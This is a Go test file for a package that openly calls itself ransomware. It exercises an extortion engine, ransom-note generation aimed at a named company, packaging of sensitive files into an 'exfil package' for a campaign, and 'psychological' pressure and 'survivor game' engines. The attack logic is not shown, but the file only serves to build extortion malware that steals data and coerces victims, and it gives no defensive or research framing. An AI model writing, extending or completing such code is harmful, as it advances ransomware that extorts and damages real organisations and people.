package ransomware

import (
	"testing"
)

func TestNewExtortionEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewExtortionEngine(cfg)
	if e == nil {
		t.Fatal("NewExtortionEngine() returned nil")
	}
}

func TestNewPsychologicalEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPsychologicalEngine(cfg)
	if p == nil {
		t.Fatal("NewPsychologicalEngine() returned nil")
	}
}

func TestNewPsychologicalAdvancedEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pa := NewPsychologicalAdvancedEngine(cfg)
	if pa == nil {
		t.Fatal("NewPsychologicalAdvancedEngine() returned nil")
	}
}

func TestExtortionEngineGenerateNote(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewExtortionEngine(cfg)

	note := e.GenerateRansomNote("TestCorp")
	if note == "" {
		t.Fatal("GenerateRansomNote returned empty")
	}
	t.Logf("Ransom note generated (%d bytes)", len(note))
}

func TestExtortionEnginePackageData(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewExtortionEngine(cfg)

	pkg, err := e.PackageSensitiveData([]string{"/tmp/test_exfil"}, "test-campaign")
	if err != nil {
		t.Logf("PackageSensitiveData: %v (expected in test env)", err)
	}
	if pkg != nil {
		t.Logf("Exfil package: ID=%s Size=%d Files=%d",
			pkg.ID, pkg.TotalSize, pkg.FileCount)
	}
}

func TestSurvivorGameEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSurvivorGameEngine(cfg)
	if s == nil {
		t.Fatal("NewSurvivorGameEngine() returned nil")
	}

	status := s.GetStatusJSON()
	if status == "" {
		t.Log("GetStatusJSON returned empty (expected in test env)")
	} else {
		t.Logf("Survivor status: %s", status)
	}
}
